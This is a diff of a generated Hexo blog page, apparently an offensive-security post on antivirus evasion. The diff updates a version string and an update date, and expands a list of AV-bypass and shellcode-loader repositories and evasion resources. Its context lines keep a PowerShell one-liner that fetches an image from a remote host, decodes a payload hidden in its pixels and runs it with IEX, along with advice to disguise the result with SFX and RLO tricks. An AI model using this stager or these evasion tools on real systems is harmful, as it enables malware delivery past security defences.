@@ -36,7 +36,7 @@
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
   </script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
@@ -209,7 +209,7 @@
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2022-08-07 22:30:34</span>
+        <span class="pc">2022-11-27 16:27:19</span>
     </span>
     
     
@@ -485,16 +485,27 @@
 <li>Get a line of code to invoke the shell:<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sal</span> a <span class="built_in">New-Object</span>;<span class="built_in">Add-Type</span> <span class="literal">-A</span> System.Drawing;<span class="variable">$g</span>=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(<span class="string">&quot;http://example.com/shell.png&quot;</span>));<span class="variable">$o</span>=a Byte[] <span class="number">5120</span>;(<span class="number">0</span>..<span class="number">1</span>)|%&#123;<span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">in</span>(<span class="number">0</span>..<span class="number">2559</span>))&#123;<span class="variable">$p</span>=<span class="variable">$g</span>.GetPixel(<span class="variable">$x</span>,<span class="variable">$_</span>);<span class="variable">$o</span>[<span class="variable">$_</span>*<span class="number">2560</span>+<span class="variable">$x</span>]=([<span class="type">math</span>]::Floor((<span class="variable">$p</span>.B<span class="literal">-band15</span>)*<span class="number">16</span>)<span class="operator">-bor</span>(<span class="variable">$p</span>.G <span class="operator">-band</span> <span class="number">15</span>))&#125;&#125;;<span class="built_in">IEX</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$o</span>[<span class="number">0</span><span class="type">..3550</span>]))</span><br></pre></td></tr></table></figure></li>
 <li>Loader-Shellcode structure is also recommended. You can compile the powershell above to a PE file, and use SFX, RLO, …</li>
 </ul>
-<h2 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h2><p>Bypass&#x2F;detect sandbox&#x2F;debugger like:</p>
+<h2 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h2><p>Bypass tools:</p>
 <ul>
-<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/dycsy/ShellcodeLoader" >ShellcodeLoader<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/Hzllaga/ShellcodeLoader" >ShellcodeLoader<i class="fas fa-external-link-alt"></i></a></li>
 <li><a class="link"   target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool" >AV_Evasion_Tool<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<p>Other tools:</p>
-<ul>
 <li><a class="link"   target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus" >BypassAntiVirus<i class="fas fa-external-link-alt"></i></a></li>
 <li><a class="link"   target="_blank" rel="noopener" href="https://github.com/admin360bug/bypass" >bypass<i class="fas fa-external-link-alt"></i></a></li>
 <li><a class="link"   target="_blank" rel="noopener" href="https://github.com/hack2fun/BypassAV/blob/master/bypass.cna" >BypassAV<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/Bl4ckM1rror/FUD-UUID-Shellcode" >FUD-UUID-Shellcode<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/knownsec/shellcodeloader" >ShellcodeLoader knownsec<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/Axx8/ShellCode_Loader" >ShellCode_Loader Axx8<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/Axx8/Bypass_AV" >Bypass_AV Axx8<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/awsaaaq/GoBP" >GoBP<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/sh3d0ww01f/nim_shellloader" >nim_shellloader<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/ORCx41/TerraLdr" >TerraLdr<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<p>Online resources:</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://unprotect.it/" >UnprotectProject - Search Evasion Techniques<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://lolbas-project.github.io/" >Living Off The Land Binaries, Scripts and Libraries<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hijacklibs.net/" >Hijack Libs<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://bypass.tidesec.com/" >TideBypass<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 
             </div>
